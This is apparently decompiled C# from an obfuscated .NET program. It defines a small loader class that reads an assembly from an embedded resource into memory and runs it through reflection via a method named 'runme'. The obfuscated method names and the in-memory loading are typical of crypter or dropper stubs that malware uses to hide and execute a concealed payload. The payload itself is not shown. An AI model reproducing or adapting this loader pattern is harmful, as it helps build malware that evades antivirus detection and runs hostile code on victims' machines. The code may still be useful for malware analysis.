using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using NS.My.Resources;

namespace NS;

internal class aL
{
	private static Assembly ASM1;

	static aL()
	{
		Class2.IoCInX5zUDeVY();
		ASM1 = AppDomain.CurrentDomain.Load(Resources.Load);
	}

	[DebuggerNonUserCode]
	public aL()
	{
		Class2.IoCInX5zUDeVY();
		base._002Ector();
	}

	public static void runme()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(ASM1.CreateInstance("A.A"));
		objectValue.GetType().InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), null);
	}

	private object s7b436IND6Q5()
	{
		while (true)
		{
		}
	}
}
